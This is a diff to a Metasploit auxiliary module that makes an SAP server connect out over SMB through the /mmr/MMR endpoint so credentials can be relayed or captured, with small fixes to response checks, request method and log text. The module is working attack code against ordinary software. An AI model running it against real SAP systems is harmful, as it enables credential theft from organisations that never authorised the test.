@@ -108,7 +108,7 @@ class Metasploit4 < Msf::Auxiliary
 			if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/
 				print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
 			else
-				vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
+				vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
 			end
 		rescue ::Rex::ConnectionError
 			print_error("#{rhost}:#{rport} - Unable to connect")
@@ -124,7 +124,7 @@ class Metasploit4 < Msf::Auxiliary
 				vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
 				res = send_request_cgi({
 					'uri' => '/mmr/MMR',
-					'method' => 'GET',
+					'method' => 'HEAD',
 					'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
 					'ctype' => 'text/xml; charset=UTF-8',
 					'vars_get' => {
@@ -135,7 +135,7 @@ class Metasploit4 < Msf::Auxiliary
 				})
 
 			else
-				vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
+				vprint_status("#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}")
 				res = send_request_cgi({
 					'uri' => '/mmr/MMR',
 					'method' => 'GET',
@@ -182,8 +182,10 @@ class Metasploit4 < Msf::Auxiliary
 					'sap-language' => 'EN'
 				}
 			})
-			if res
-				vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
+			if res and res.code == 500 and res.body =~ /OPEN_FAILURE/
+				print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
+			else
+				vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
 			end
 		rescue ::Rex::ConnectionError
 			print_error("#{rhost}:#{rport} - Unable to connect")
